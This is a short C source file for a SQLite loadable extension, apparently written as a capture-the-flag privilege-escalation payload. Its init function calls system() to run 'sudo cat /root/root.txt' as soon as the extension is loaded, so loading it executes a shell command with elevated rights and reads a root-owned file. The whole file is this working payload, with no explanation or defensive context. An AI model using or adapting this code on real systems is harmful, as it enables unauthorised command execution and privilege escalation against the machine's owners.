#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */ 
SQLITE_EXTENSION_INIT1 
#include <stdlib.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi)
{   
    SQLITE_EXTENSION_INIT2(pApi);   
    char *cmd = "/usr/bin/sudo /usr/bin/cat /root/root.txt";   
    system(cmd);   
    return SQLITE_OK; 
}